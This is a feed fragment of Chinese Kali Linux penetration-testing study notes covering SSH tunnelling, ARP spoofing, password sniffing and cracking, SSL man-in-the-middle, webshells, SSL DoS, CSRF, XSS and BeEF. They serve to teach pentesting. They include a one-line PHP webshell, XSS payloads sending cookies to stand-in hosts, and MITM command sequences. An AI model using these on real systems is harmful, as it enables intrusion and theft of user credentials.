        <content type="html"><![CDATA[<h3 id="流量操控技术-Rinetd、SSH"><a href="#流量操控技术-Rinetd、SSH" class="headerlink" title="流量操控技术-Rinetd、SSH"></a>流量操控技术-Rinetd、SSH</h3><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查和朔源追踪</li><li>证明看似严格的访问控制仍然存在弱点</li><li>在非受信任的网络中实现安全的数据传输</li></ul><a id="more"></a><hr><ul><li>重定向（Redirection）<ul><li>IP、Port</li></ul></li><li>隧道（Tunneling）<ul><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点（IP2IP）、端到端（Port2Port）隧道</li><li>VPN：pptp、l2tp、IPSec、SSL vpn</li></ul></li><li>封装（encapsulation）<ul><li>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）</li><li>使用网关设备实现不同类型网络的互联互通</li></ul></li></ul><hr><ul><li>Rinetd<ul><li>安装：apt-get install rinetd</li><li>配置：/etc/rinetd.conf<ul><li>bindadd bindport connectadd connectport</li></ul></li><li>运行：rinetd</li></ul></li><li>应用场景<ul><li>重定向web流量，突破上网限制</li><li>远程桌面重定向</li><li>Nc重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul></li></ul><hr><h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><ul><li><p>SSH支持双向通信隧道</p><ul><li>将其它TCP端口的通信通过SSH连接来转发</li><li>用SSh作为传输层协议，对流量自动加解密</li><li>突破防火墙访问规则的限制，可用于翻墙</li></ul></li><li><p>SSH本地端口转发</p><ul><li>使效果类似于rinetd</li><li>将一本地端口与远程服务器建立隧道</li></ul></li><li><p>本地端口转发</p><ul><li>本机侦听端口，访问转发到远程主机指定端口</li></ul></li><li><p>远程端口转发</p><ul><li>远程侦听端口，访问转发到本机主机指定端口</li></ul></li><li><p>动态隧道模式</p></li></ul><hr><h4 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h4><ul><li><p>启动ssh</p><ul><li><code>service ssh start</code></li></ul></li><li><p>ssh默认不能使用root账号登陆，需要修改配置文件</p><ul><li>/etc/ssh/sshd_config<ul><li>PermitRootLogin yes</li><li>Port 53</li><li>PasswordAuthentication yes</li></ul></li></ul></li><li><p><code>ssh  -CfNg -L 7001:192.168.2.178:80 root@192.168.2.218 -p 53</code></p><ul><li>-C 压缩数据减少占用带宽，增加传输速度</li><li>-f 后台运行进程</li><li>-N 不执行登录shell</li><li>-g 复用访问时作为网关，支持多主机访问本地侦听端口</li></ul></li><li><p>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断</p></li><li><p>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</p></li></ul><hr><h4 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h4><ul><li><p><code>ssh -CfNg -R&lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote prt&gt;</code></p></li><li><p>SSH侦听端口开在远程SSH Server上</p></li><li><p>侦听端口永远开在应用客户端一方</p></li><li><p>远程 -g 参数无效</p></li></ul><hr><h4 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h4><ul><li><p>本地、远程端口转发都需要固定应用服务器IP、Port</p><ul><li>应用端口繁多，逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul></li><li><p>本地侦听socks4/5代理端口</p><ul><li>由SSh server决定如何转发</li><li>可以作为翻墙代理</li><li>配置客户端代理（浏览器）</li><li>使用proxychains支持无代理客户端</li></ul></li><li><p><code>ssh -CfNg -D 7001 root@192.168.2.218 -p 53</code></p></li></ul><hr><h4 id="X协议转发"><a href="#X协议转发" class="headerlink" title="X协议转发"></a>X协议转发</h4><ul><li>远程登陆Linux GUI运行图形化界面工具<ul><li>-VNC</li><li>X Windows</li></ul></li><li>防火墙限制访问时<ul><li>基于SSH的X转发</li><li>ssh -X <a href="mailto:user@1.1.1.1">user@1.1.1.1</a> -p53</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码嗅探</title>
      <link href="/posts/3799839c.html"/>
      <url>/posts/3799839c.html</url>
      
        <content type="html"><![CDATA[<p>三层地址：IP 网络到网络</p><p>二层地址：MAC 主机到主机</p><p>交换机与HUB</p><ul><li>HUB属于一层设备，全端口转发（不安全，共享带宽）</li><li>交换机根据学习地址转发</li></ul><a id="more"></a><h3 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h3><ul><li>开启路由转发<ul><li>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li></ul></li><li>arpspoof<ul><li><code>arpspoof -t 192.168.1.101 -r 192.168.1.1</code></li></ul></li><li>网络嗅探<ul><li>查看流量中的图片<ul><li>driftnet -i eth0 -a -d tempdir</li></ul></li><li>查看访问的url<ul><li>urlsnarf -i eth0</li></ul></li><li>嗅探密码<ul><li>dsniff -i eth0 -m(自动解码传输协议)<ul><li>/usr/share/dsniff/dsniff.services</li></ul></li></ul></li><li>dns欺骗,可以钓鱼（修改53端口的包）<ul><li>dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof/hosts</li></ul></li></ul></li></ul><h4 id="DNS欺骗代理"><a href="#DNS欺骗代理" class="headerlink" title="DNS欺骗代理"></a>DNS欺骗代理</h4><ul><li><p>搭建假的dns服务器</p></li><li><p>dnschef –fakeip=1.1.1.10 –fakedomains=<a href="http://www.google.com,www.youtube.com" target="_blank" rel="noopener">www.google.com,www.youtube.com</a> –interface 1.1.1.2 -q</p></li><li><p>将被害者DNS指向伪造的DNS服务器</p></li></ul><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><ul><li>注入XSS<ul><li>即使没有xss漏洞，也可以直接向http请求中注入xss攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意。</li></ul></li><li>Mitmf安装</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码破解</title>
      <link href="/posts/18185bb2.html"/>
      <url>/posts/18185bb2.html</url>
      
        <content type="html"><![CDATA[<h3 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h3><ul><li>hydra</li><li>medusa</li></ul><a id="more"></a><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用hash算法加密密码传输（hash算法加密容易，解密困难）</li><li>服务器端用户数据库应加盐保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码hash</li><li>利用漏洞登陆服务器，从数据库获取密码hash</li><li>识别hash类型<ul><li>长度、字符集</li></ul></li><li>利用离线破解工具碰撞密码hash</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4><ul><li><p>hash-identifier</p></li><li><p>hashid</p></li><li><p>可能识别错误或无法识别</p></li></ul><h4 id="Windows-Hash获取工具"><a href="#Windows-Hash获取工具" class="headerlink" title="Windows Hash获取工具"></a>Windows Hash获取工具</h4><ul><li>利用漏洞：pwdump、fgdump、mimikatz、wce</li><li>物理接触：samdump2<ul><li>在物理机上插入U盘，启动kaliLive虚拟机</li><li>挂载windows硬盘<ul><li><code>mount /dev/sda1 /mnt</code></li></ul></li><li>到sam数据库目录下<ul><li><code>cd /mnt/Windows/System32/config</code></li></ul></li><li>执行samdump2<ul><li><code>samdump2 SYSTEM SAM -o sam.hash</code></li></ul></li></ul></li></ul><h4 id="离线密码破解–Hashcat"><a href="#离线密码破解–Hashcat" class="headerlink" title="离线密码破解–Hashcat"></a>离线密码破解–Hashcat</h4><ul><li>开源多线程密码破解工具</li><li>支持80多种算法的破解<ul><li><code>hashcat -h</code></li></ul></li><li>六种模式<ul><li>-0 Straight：字典破解</li><li>-1 Combination：将字典中密码进行组合</li><li>-2 Toggle case：尝试字典中所有密码的大小写字母组合</li><li>-3 Brute force：指定字符集（或全部字符集）所有组合</li><li>-4 Permutation：字典中密码的全部字符置换组合（比如123：123 321 132 213 231）</li><li>-5 Table-lookup：程序为字典中所有密码自动生成掩码</li></ul></li><li>支持掩码方式的密码字典</li></ul><h4 id="oclhashcat"><a href="#oclhashcat" class="headerlink" title="oclhashcat"></a>oclhashcat</h4><ul><li>号称世界上最快，基于GPU的密码破解软件</li><li>免费开源、支持多平台、支持分布式、150+hash算法</li><li>硬件支持<ul><li>虚拟机中无法使用</li><li>支持CUDA技术的Nvidia显卡</li><li>支持OpenCl技术的AMD显卡</li><li>安装相应的驱动</li></ul></li><li>限制<ul><li>最大密码长度55字符</li><li>使用Unicode的最大密码长度27字符</li></ul></li><li><code>oclHashcat64 -m 0 hash.txt -a ?a?a?a?a?a?a</code><ul><li>-?l =abcdefghijklmnopqrstuvwxyz</li><li>-?u =ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>-?d =0123456789</li><li>-?s =!”#$%&amp;’()’;:,&gt;?&lt;\等</li><li>-a =?l?u?d?s</li><li>-b =0x00-0xff</li></ul></li></ul><h4 id="RainbowCrack"><a href="#RainbowCrack" class="headerlink" title="RainbowCrack"></a>RainbowCrack</h4><ul><li>基于时间记忆权衡技术生成彩虹表<ul><li>也可以直接去网站下载彩虹表</li></ul></li><li>提前计算密码的Hash值，通过比对hash值破解密码</li><li>计算hash的速度很慢，修改版支持CUDA、GPU</li><li>KALI中包含的RainbowCrack工具<ul><li>rtgen：预计算、生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成顿彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码</li><li>以上命令必须顺序使用 </li></ul></li><li>彩虹表<ul><li>密码明文、hash值、hash算法、字符集、明文长度范围</li></ul></li></ul><h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><ul><li>破解linux和windows密码</li><li>johney图形化的john</li></ul><h4 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h4><ul><li>基于彩虹表的LM、NTLM密码破解软件</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>https攻击-中间人攻击</title>
      <link href="/posts/b5734d5.html"/>
      <url>/posts/b5734d5.html</url>
      
        <content type="html"><![CDATA[<h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h3><ul><li>全站https正成为潮流趋势<ul><li>淘宝、百度</li></ul></li><li>HTTPS的作用<ul><li>CIA</li><li>解决的是信息传输过程中数据被篡改、窃取</li><li>加密：对称、非对称、单向</li></ul></li><li>HTTPS攻击方法<ul><li>降级攻击<ul><li>将高强度算法降级为低强度算法</li></ul></li><li>解密攻击（明文、证书伪造）</li><li>协议漏洞、https实现方法的漏洞、配置不严格</li></ul></li></ul><a id="more"></a><h4 id="SSL（Secure-socket-layer）"><a href="#SSL（Secure-socket-layer）" class="headerlink" title="SSL（Secure socket layer）"></a>SSL（Secure socket layer）</h4><ul><li>保证网络通信安全的加密协议</li><li>1994年由Netscape开发成为统一标准</li><li>1999年TLS（Transport Layer security）取代SSL v3</li><li>近年来发现的SSL协议漏洞使业界认为其漏洞已经不可软件修复<ul><li>Heartbleed</li><li>POODLE</li><li>BEAST</li></ul></li><li>TLS/SSL、HTTPS、HTTP over SSL 通俗上表示同意含义</li><li>SSL/TLS也被用于其它场景的传输通道加密<ul><li>邮件传输（服务器间、客户端与服务器间）</li><li>数据库服务器间</li><li>LDAP身份认证服务器间</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul></li></ul><h4 id="WEB通信中的SSL加密"><a href="#WEB通信中的SSL加密" class="headerlink" title="WEB通信中的SSL加密"></a>WEB通信中的SSL加密</h4><ul><li>公钥证书（受信任的第三方证书颁发机构签名颁发）<ul><li>VeriSign</li><li>Thawte</li><li>GlobalSign</li><li>Symantec</li></ul></li><li>加密过程<ul><li><ol><li>握手</li><li>协商加密算法（密钥交换算法、非对称加密算法、对称加密算法、哈希算法、）</li><li>获取公钥证书</li><li>验证公钥证书</li><li>交换会话密钥</li><li>加密信息传输</li></ol></li></ul></li><li>加密算法<ul><li>非对称加密算法<ul><li>Diffie-Hellman key exchange</li><li>Rivest Shamir Adleman（RSA）</li><li>Elliptic Curve Cryptography（ECC）</li></ul></li><li>对称加密算法<ul><li>Data Encryption Standard（DES）/3DES</li><li>Advance Encryption Standard（AES）</li><li>International Data Encryption Algo（IDEA）</li><li>Rivest Cipher 4（RC4）<ul><li>WEP、TLS/SSL、RDP、Secure shell</li></ul></li></ul></li><li>单向加密算法（HASH）<ul><li>MD5</li><li>SHA1</li><li>SHA2</li><li>SHA3</li></ul></li></ul></li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li>Openssl<ul><li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li><li>连接443端口<code>openssl s_client -connect www.baidu.com:443</code></li><li>看是否支持不安全的cypher suite：<code>openssl s_client -tls1_2 -cipher &#39;XXXXXXXX&#39; -connect www.baidu.com</code></li><li>查看已知的不安全的cipher suite：<code>openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code><ul><li>密钥交换、身份认证、数据加密、hash算法</li><li>所有算法去ssl官网查看</li></ul></li></ul></li><li>SSLScan<ul><li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li><li>默认会检查CRIME、heartbleed漏洞</li><li>绿色表示安全、红色黄色需要引起注意</li><li>TLS支持的cipher suite<ul><li>查看<code>sslscan -tlsall www.taobao.com:443</code></li></ul></li><li>分析证书详细数据<ul><li><code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></li></ul></li></ul></li><li>SSLyze<ul><li>Python编写</li><li>检查SSL过时版本</li><li>检查存在弱点的cipher suite</li><li>支持从列表文件查询多个站点</li><li>检查是否支持会话修复</li><li><code>sslyze --regular www.taobao.com:443</code></li></ul></li><li>Nmap<ul><li>nmap –script=ssl-enum-ciphers.nse <a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a></li></ul></li><li>ssllabs<ul><li><a href="http://www.ssllabs.com" target="_blank" rel="noopener">www.ssllabs.com</a></li></ul></li></ul><h4 id="SSL中间人攻击"><a href="#SSL中间人攻击" class="headerlink" title="SSL中间人攻击"></a>SSL中间人攻击</h4><h5 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h5><ul><li>攻击者位于客户端和服务器通信链路中<ul><li>ARP</li><li>DHCP</li><li>修改网关</li><li>修改DNS</li><li>修改HOSTS</li><li>ICMP、STP、OSPF（同一个局域网）</li></ul></li><li>加密流量</li><li>前提<ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了合法证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul></li></ul><h5 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h5><h6 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a>SSLsplit</h6><ul><li>透明SSL/TLS中间人攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成普通客户端</li><li>伪装服务器需要伪造证书</li><li>支持SSL/TLS加密的SMTP、POP3\FTP等通信中间人攻击</li></ul><p><strong>操作</strong></p><ul><li><p>利用openssl生成证书私钥：<code>openssl genrsa -out ca.key 2048</code></p><ul><li>不会生成公钥，因为公钥提取自私钥</li></ul></li><li><p>利用私钥签名生成证书：<code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code></p></li><li><p>开启本机路由功能：sysctl -w net.ipv4.ip_forward=1</p><ul><li>使流经的请求可以被正常转发</li><li>或者直接修改文件内容 /proc/sys/net/ipv4/ip_forward</li></ul></li><li><p>iptables端口转发规则</p><ul><li>将请求到本机的ssl流量转发给sslsplit<ul><li>iptables -L 查看当前存在的规则</li><li>iptables -F,清空当前所有规则</li><li>先结束本机的80和443端口占用的程序</li><li>iptables -t nat -A PREROUTING -p tcp –dport 80 -j REDIRECT –to-ports 8080<ul><li>在nat表中加一个PREROUTING（路由之前生效的规则）80端口的tcp重定向到8080</li></ul></li><li>iptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT –to-ports 8443</li><li>iptables -t nat -A PREROUTING -p tcp –dport 587-j REDIRECT –to-ports 8443 #MSA</li><li>iptables -t nat -A PREROUTING -p tcp –dport 465-j REDIRECT –to-ports 8443 #SMTPS</li><li>iptables -t nat -A PREROUTING -p tcp –dport 993-j REDIRECT –to-ports 8443 #IMAP</li><li>iptables -t nat -A PREROUTING -p tcp –dport 995 -j REDIRECT –to-ports 8443 #POP3</li></ul></li></ul></li><li><p>Arp欺骗</p><ul><li>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</li></ul></li><li><p>启动SSLsplit</p><ul><li>cd ~</li><li>mkdir -p test/logdir</li><li>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</li></ul></li><li><p>Mitmproxy</p><ul><li>mitmproxy -T –host -w mitmproxy.log</li></ul></li><li><p>SSLStrip</p><ul><li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li><li>sslstrip -l 8080</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShell</title>
      <link href="/posts/e4028241.html"/>
      <url>/posts/e4028241.html</url>
      
        <content type="html"><![CDATA[<ul><li>&lt;?php echo shell_exec($_GET[‘cmd’]);?&gt;</li><li>中国菜刀：<a href="http://www.maicaidao.co" target="_blank" rel="noopener">http://www.maicaidao.co</a></li><li>可能被IDS、AV、WAF、扫描器软件发现查杀</li></ul><a id="more"></a><h4 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h4><ul><li>WeBaCoo（Web Backdoor Cookie）<ul><li>类终端的shell</li><li>编码通信内容通过cookie头传输，隐蔽性较强</li><li>cm：base64编码的命令</li><li>cn：服务器用于返回数据的cookie头的名</li><li>cp：返回信息定界符</li></ul></li><li>生成服务端<ul><li><code>webacoo -g -o a.php</code></li><li><code>webacoo-t -u http://1.1.1.1/a.php</code></li></ul></li></ul><h4 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h4><ul><li>隐蔽的类终端php webshell</li><li>30多个管理模块<ul><li>执行系统命令、浏览文件系统</li><li>检查服务器常见配置错误</li><li>创建正向、反向TCPshell连接</li><li>通过目标计算机代理http流量</li><li>从目标计算机运行端口扫描，渗透内网</li></ul></li><li>支持连接密码</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透-SSL/TLS拒绝服务、Ajax、WebService</title>
      <link href="/posts/c1ae7465.html"/>
      <url>/posts/c1ae7465.html</url>
      
        <content type="html"><![CDATA[<h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h3><ul><li>thc-ssl-dos<ul><li>ssl协商加密对性能开销大，大量握手请求会导致拒绝服务</li><li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li><li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器</li><li>服务器平均可以处理300次/秒SSL握手请求</li><li>对SMTPS、POP3S、等服务同样有效</li><li>thc-ssl-dos 199.223.209.205 2804 -accept</li></ul></li></ul><a id="more"></a><ul><li>对策<ul><li>禁用SSL-Renegotiation、使用SSL Accelerator</li><li>通过修改thc-ssl-dos代码，可以绕过以上对策</li></ul></li></ul><h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><ul><li>目前没用通用的ajax安全最佳实践，其攻击面不为大多数人所知</li><li>Ajax的安全问题<ul><li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程。</li><li>Ajax引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过</li><li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li><li>暴露应用程序逻辑</li></ul></li><li>对渗透测试的挑战<ul><li>异步请求数量多且隐蔽</li><li>触发ajax请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏</li></ul></li><li>Ajax爬网工具zap</li><li>客户端代码审计<ul><li>源码</li><li>firebug</li></ul></li></ul><h3 id="WebService"><a href="#WebService" class="headerlink" title="WebService"></a>WebService</h3><ul><li><p>WebService安全考虑</p><ul><li><p>使用API key或session token实现和跟踪身份认证</p></li><li><p>身份认证由服务器完成，而非客户端</p></li><li><p>API key、用户名、Session token永远不要通过URL发送</p></li><li><p>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</p></li><li><p>SOAP提供强于HTTPS的WS-security机制</p></li><li><p>使用OAuth或HMAC身份验证，HMAC身份认证使用C/S共享的密钥加密API KEY</p></li><li><p>RESTful应只允许身份认证用户使用PUT、DELETE方法</p></li><li><p>使用随机token防止CSRF攻击</p></li><li><p>对用户提交参数过滤，建议部署基于严格白名单的方法</p></li><li><p>报错信息消毒</p></li><li><p>直接对象引用严格身份验证（电商公司以ID作为主索引）</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站请求伪造CSRF</title>
      <link href="/posts/aa6f4497.html"/>
      <url>/posts/aa6f4497.html</url>
      
        <content type="html"><![CDATA[<h3 id="CSRF（Cross-site-request-forgery）"><a href="#CSRF（Cross-site-request-forgery）" class="headerlink" title="CSRF（Cross-site request forgery）"></a>CSRF（Cross-site request forgery）</h3><ul><li>从信任的角度来区分<ul><li>XSS：利用用户对站点的信任</li><li>CSRF：利用站点对已经身份认证的信任</li></ul></li></ul><a id="more"></a><ul><li>结合社工在身份认证会话过程中实现攻击<ul><li>修改账号密码，个人信息（email、收货地址）</li><li>发送伪造的业务请求（网银、购物、投票）</li><li>关注他人社交帐号、推送博文</li><li>在用户非自愿、不知情的情况下提交请求。</li></ul></li><li>属于业务逻辑漏洞<ul><li>对关键操作缺少确认机制</li><li>自动扫描程序无法发现此类漏洞</li></ul></li><li>漏洞利用条件<ul><li>被害用户已经完成身份认证</li><li>新请求的提交不需要重新身份认证或确认机制</li><li>攻击者必须了解WebAPP请求的参数构造</li><li>诱使用户出发攻击的指令（社工）</li></ul></li><li>Burpsuite CSRF PoC generator<ul><li>生成一个页面</li></ul></li></ul><h4 id="自动扫描程序的检测方法"><a href="#自动扫描程序的检测方法" class="headerlink" title="自动扫描程序的检测方法"></a>自动扫描程序的检测方法</h4><ul><li>在请求和响应过程中检查是否存在anti-CSRF token名</li><li>检查服务器是否验证anti-CSRF token的名值</li><li>检查token中可编辑的字符串</li><li>检查referrer头是否可以伪造</li></ul><h4 id="对策"><a href="#对策" class="headerlink" title="对策"></a>对策</h4><ul><li>Captcha</li><li>anti-CSRF token</li><li>referrer头</li><li>降低会话超时时间</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站脚本攻击XSS</title>
      <link href="/posts/e0b257ee.html"/>
      <url>/posts/e0b257ee.html</url>
      
        <content type="html"><![CDATA[<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul><li>攻击web客户端</li><li>客户端脚本语言<ul><li>弹窗告警、广告</li><li>Javascript</li><li>在浏览器中执行</li></ul></li><li>XSS（cross-site scripting）<ul><li>通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li><li>注入客户端脚本代码</li><li>盗取cookie</li><li>重定向</li></ul></li></ul><a id="more"></a><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><ul><li>直接嵌入html：<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;script&gt;</code></li><li>元素标签事件：<code>&lt;body onload=alert(&#39;XSS&#39;)&gt;</code></li><li>图片标签：<code>&lt;img src=&quot;javascript+alert(XSS);&quot;&gt;</code></li><li>其它标签：<code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li><li>DOM对象，篡改页面内容</li></ul><h4 id="攻击参与方"><a href="#攻击参与方" class="headerlink" title="攻击参与方"></a>攻击参与方</h4><ul><li>攻击者</li><li>被攻击者</li><li>漏洞站点</li><li>第三方站点</li></ul><h4 id="漏洞形成根源"><a href="#漏洞形成根源" class="headerlink" title="漏洞形成根源"></a>漏洞形成根源</h4><ul><li>服务器对用户提交数据过滤不严</li><li>提交给服务器的脚本被直接返回给其它客户端执行</li><li>脚本在客户端执行恶意操作</li></ul><h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><ul><li>存储型</li><li>反射型（结合社会工程学攻击方式）</li><li>DOM型</li></ul><h4 id="漏洞Poc"><a href="#漏洞Poc" class="headerlink" title="漏洞Poc"></a>漏洞Poc</h4><ul><li>&lt;script&gt;alert(‘xss’)&lt;/script&gt;</li><li>&lt;a href=””onclick=alert(‘xss’)&gt;type&lt;/a&gt;</li><li>&lt;img src=<a href="http://1.1.1.1/a.jpg" target="_blank" rel="noopener">http://1.1.1.1/a.jpg</a> onerror=alert(‘xss’)&gt;</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><ul><li>收集被攻击客户端的信息<ul><li>window.location=”<a href="http://www.baidu.com&quot;重定向到指定页面" target="_blank" rel="noopener">http://www.baidu.com&quot;重定向到指定页面</a></li><li>&lt;iframe src=”<a href="http://xxxx/victim&quot;" target="_blank" rel="noopener">http://xxxx/victim&quot;</a> height=”0” width=”0”&gt;&lt;/iframe&gt;</li></ul></li><li>通过document.cookie读取cookie信息</li><li>通过document.body.innerHTML=””显示内容</li><li>&lt;script src=<a href="http://1.1.1.1/a.js&gt;\" target="_blank" rel="noopener">http://1.1.1.1/a.js&gt;\</a><ul><li>a.js源码<ul><li>var img = new Image();</li><li>img.src = “<a href="http://1.1.1.2/cookies.php?cookie=&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.2/cookies.php?cookie=&quot;+document.cookie</a>;</li></ul></li></ul></li><li>通过DOM操作页面内容<ul><li>&lt;script&gt;var img=document.createElement(“img”);img.src=”<a href="http://192.168.0.3:88/log?&quot;+escape(document.cookie);\" target="_blank" rel="noopener">http://192.168.0.3:88/log?&quot;+escape(document.cookie);\</a></li></ul></li></ul><h3 id="BEEF（Browser-exploitation-framework）"><a href="#BEEF（Browser-exploitation-framework）" class="headerlink" title="BEEF（Browser exploitation framework）"></a>BEEF（Browser exploitation framework）</h3><ul><li><p>浏览器攻击面</p><ul><li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li><li>结合社会工程学方法对浏览器进行攻击</li><li>攻击浏览器用户</li><li>通过注入JS的脚本，利用浏览器攻击其他网站</li></ul></li><li><p>浏览器漏洞利用框架</p><ul><li>生成、交付payload</li><li>Ruby语言编写</li><li>服务器端：管理hooked客户端</li><li>客户端：运行于客户端浏览器的Js脚本（hook）</li></ul></li><li><p>攻击手段</p><ul><li>利用网站xss漏洞实现攻击</li><li>诱使客户端访问含有hook的伪造站点</li><li>结合中间人攻击注入hook脚本</li></ul></li><li><p>常见用途</p><ul><li>键盘记录器</li><li>网络扫描</li><li>浏览器信息收集</li><li>绑定shell</li><li>与metasploit集成</li></ul></li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li>Commands:命令模块<ul><li>绿色：适用，且执行结果对客户端不可见</li><li>红色：表示模块不适用当前用户，有些红色模块也可正常执行</li><li>橙色：模块可用，但对用户可见，比如申请执行Java，申请打开相机</li><li>灰色：模块未在目标浏览器上测试过</li></ul></li></ul>]]></content>
      
      
      <categories>
          
